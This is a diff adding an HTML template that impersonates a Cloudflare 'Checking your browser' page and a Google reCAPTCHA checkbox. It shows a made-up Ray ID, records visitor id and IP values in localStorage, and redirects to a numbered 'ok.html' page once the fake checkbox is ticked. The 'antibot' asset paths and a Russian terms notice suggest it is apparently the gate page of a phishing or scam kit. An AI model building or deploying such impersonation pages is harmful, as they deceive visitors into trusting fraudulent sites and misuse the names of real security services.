@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="./0/antibot/antibot.css">
+    <title>Just a moment...</title>
+</head>
+<body>
+    <input type="hidden" id="num"value=<%=num%>>
+    <input type="hidden" id="id"value=<%=id%>>
+    <input type="hidden" id="ip"value=<%=ip%>>
+    <container id='step1'>
+        <div class="centered">
+            <img src="./antibot/loading.gif" alt="" id="loading">
+            <h2 id='host'>Cheking your browser before accessing </h2>
+            <p>This process is automatic. Your browser will redirect to your requested content shortly.<br>Please allow up to 5 seconds...</p>
+            <br>
+            <a href="#">DDoS protection by Cloudflare</a><br>
+            <span id="randid">Ray ID: </span>
+        </div>
+    </container>
+    <div class="body-stage2">
+        <container id="step2">
+            <div class="header">
+                <h1>One more step</h1>
+                <h3 id='host2'>Please complete the security check to access </h3>
+            </div>
+            <div class="body">
+                <div class="row">
+                    <div class="w-block">
+                        <div class="captcha">
+                            <input type="checkbox" name="" id="next">
+                            <span>I'm not a robot</span>
+                            <img src="./0/antibot/google_recaptcha-official.svg" alt="" id='recaptcha'>
+                        </div>
+                        <span class="mute">Нажимая на кнопку вы соглашетесь с <a href="./terms.html">пользовательским соглашением</a></span>
+                    </div>
+                </div>
+                <div class="row2">
+                    <img src="./0/antibot/warning.png" alt="">
+                </div>
+            </div>
+        </container>
+    </div>
+    
+
+    <script>
+        localStorage.setItem('id',document.querySelector('#id').value)
+        localStorage.setItem('ip',document.querySelector('#ip').value)
+        document.querySelector('#host').textContent = document.querySelector('#host').textContent + location.host
+        document.querySelector('#randid').textContent = document.querySelector('#randid').textContent + (Math.floor(Math.random() * (99999999999999999999 - 99999999999)) + 99999999999).toString(36)
+        setTimeout(()=>{
+            document.querySelector('#step1').style.display = 'none'
+            document.querySelector('#step2').style.display = 'block'
+        }, Math.floor(Math.random() * (2800 - 500)) + 500)
+        document.querySelector('#next').addEventListener('change',()=>{
+            location.replace(`./${document.querySelector('#num').value}/ok.html`)
+        })
+    </script>
+</body>
+</html>
